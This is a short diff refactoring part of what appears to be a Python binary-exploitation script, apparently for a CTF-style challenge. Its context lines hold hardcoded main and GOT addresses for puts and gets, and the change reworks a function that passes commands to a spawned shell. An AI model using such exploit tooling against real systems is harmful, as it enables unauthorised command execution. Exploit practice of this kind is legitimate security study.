@@ -26,10 +26,8 @@ mainAddr = 0x804847b
 gotPuts = 0x80497ac
 gotGets = 0x80497a8
 
-redirectStdErr = True
-
 # Check if reverse shell was spawned then handle user input and output for the process
-def handle_reverse_shell():
+def handle_reverse_shell(proc, redirect_stderr=True):
     # Check if shell was sucessfully executed
     noEOF = True
     try:
@@ -40,7 +38,7 @@ def handle_reverse_shell():
 
     # Create terminal input with option to automatically redirect stderr to stdout
     commandModifier = b""
-    if redirectStdErr:
+    if redirect_stderr:
         commandModifier = b" 2>&1"
     while noEOF:
         command = input("$ ")
